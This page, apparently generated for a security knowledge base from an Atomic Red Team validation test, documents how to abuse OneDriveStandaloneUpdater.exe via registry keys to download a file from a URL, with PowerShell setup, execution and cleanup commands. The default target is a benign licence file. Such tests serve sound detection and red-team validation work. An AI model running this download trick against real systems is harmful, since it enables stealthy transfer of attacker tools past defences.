---
atomic_guid: "3dd6a6cf-9c78-462c-bd75-e9b54fc8925b"
title: "Download a file with OneDrive Standalone Updater"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "3dd6a6cf-9c78-462c-bd75-e9b54fc8925b"
  - "Download a file with OneDrive Standalone Updater"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Download a file with OneDrive Standalone Updater

Uses OneDrive Standalone Updater to download a file from a specified URL by setting up the required registry keys.
This technique can be used to download files without executing anomalous executables.
Reference: https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/

## Metadata

- Atomic GUID: 3dd6a6cf-9c78-462c-bd75-e9b54fc8925b
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### onedrive_path

- description: Path to OneDrive Standalone Updater executable
- type: path
- default: C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe

### remote_url

- description: URL to download file from
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

## Dependencies

OneDriveStandaloneUpdater.exe must exist on disk at specified location

### Prerequisite Check

```powershell
if (Test-Path "#{onedrive_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Write-Host "OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Please install OneDrive or specify correct path."
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
if (-not (Test-Path "#{onedrive_path}")) {
    Write-Host "OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Test cannot continue."
    exit 1
}

New-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateRingSettingURLFromOC" -Value "#{remote_url}" -Type String -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "ODSUUpdateXMLUrlFromOC" -Value "#{remote_url}" -Type String -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateXMLUrlFromOC" -Value "#{remote_url}" -Type String -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateOfficeConfigTimestamp" -Value 99999999999 -Type QWord -Force

# Run OneDrive Standalone Updater
& "#{onedrive_path}"
```

### Cleanup

```powershell
Remove-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force -ErrorAction Ignore
Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json" -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
